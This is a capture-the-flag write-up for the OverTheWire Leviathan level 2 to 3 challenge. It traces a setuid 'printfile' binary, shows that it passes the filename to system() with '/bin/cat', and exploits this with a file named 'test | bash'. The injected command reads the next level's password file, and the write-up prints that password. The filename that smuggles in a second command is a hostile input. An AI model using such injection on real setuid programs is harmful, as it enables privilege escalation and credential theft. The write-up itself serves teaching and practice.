# Leviathan Level 2 → Level 3


You can watch the walkthrough for this level here:  
[![YouTube](https://img.shields.io/badge/YouTube-Walkthrough-red?logo=youtube)](https://www.youtube.com/watch?v=1MKLBy1_KdA)

> This video shows my full process solving (in Spanish) Level 2 from scratch, including the obstacles and mistakes I faced along the way. Some walkthroughs might be longer or shorter depending on the complexity of the level or how quickly I find the solution.

---

## 🔍 Exploration

We begin by inspecting the current directory and the discovered binary:

```bash
leviathan2@gibson:~$ ls -l
total 16
-r-sr-x--- 1 leviathan3 leviathan2 15072 Apr 10 14:23 printfile
leviathan2@gibson:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
```

The binary has SUID permissions and requests a file to print:

```bash
leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
```
Let’s test it:

```bash
leviathan2@gibson:~$ ls -a 
.  ..  .bash_logout  .bashrc  printfile  .profile
leviathan2@gibson:~$ ./printfile .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

We use `ltrace` to trace library calls:

```bash
leviathan2@gibson:~$ ltrace ./printfile .bashrc 
__libc_start_main(0x80490ed, 2, 0xffffd384, 0 <unfinished ...>
access(".bashrc", 4)                                                                                             = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")                                                      = 16
geteuid()                                                                                                        = 12002
geteuid()                                                                                                        = 12002
setreuid(12002, 12002)                                                                                           = 0
system("/bin/cat .bashrc"# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                           = 0
+++ exited (status 0) +++
```

It builds and executes the command `/bin/cat <filename>` via `system()` . This suggests a command injection vulnerability:

```bash
leviathan2@gibson:~$ ltrace ./printfile .bashrc 
__libc_start_main(0x80490ed, 2, 0xffffd384, 0 <unfinished ...>
access(".bashrc", 4)                                                                                             = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")                                                      = 16
geteuid()                                                                                                        = 12002
geteuid()                                                                                                        = 12002
setreuid(12002, 12002)                                                                                           = 0
system("/bin/cat .bashrc"# ~/.bashrc: executed by bash(1) for non-login shells.
```

We can see that what is using the binary is a `/bin/cat` for the file we are giving, and using the function system. 

## 💣 Exploitation


With a deeper exploration (as shown in the walkthrough), we can determine two key points for the exploitation:

- The filename must include a command that manipulates the output of `/bin/cat`.
- The binary checks whether the file **exists** before executing the command via `system()`.

This opens the door for **command injection** by crafting a filename that includes a pipe (`|`) to redirect the output of `/bin/cat` into a command of our choice (e.g., `bash`).

---

### Step 1: Create a temporary working directory
 ```bash
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.tXQrG5v6Ix
leviathan2@gibson:~$ chmod +x /tmp/tmp.tXQrG5v6Ix
leviathan2@gibson:~$ cd /tmp/tmp.tXQrG5v6Ix
leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$
```

### Step 2: Create a payload file
 ```bash
leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ echo 'cat /etc/leviathan_pass/leviathan3' > test
leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ cat test
cat /etc/leviathan_pass/leviatan3
```

### Step 3: Create a malicious file name that will be executed
```bash
viathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ touch "test | bash"
leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ ls
test  test | bash
```

This will trigger the following when passed to the binary:`/bin/cat test | bash`

### Step 4: Run the exploit
```bash
leviathan2@gibson:~$ ./printfile "/tmp/tmp.tXQrG5v6Ix/test | bash"
f0n8h2iWLP
```
## 🔐 Password for Leviathan 3
f0n8h2iWLP

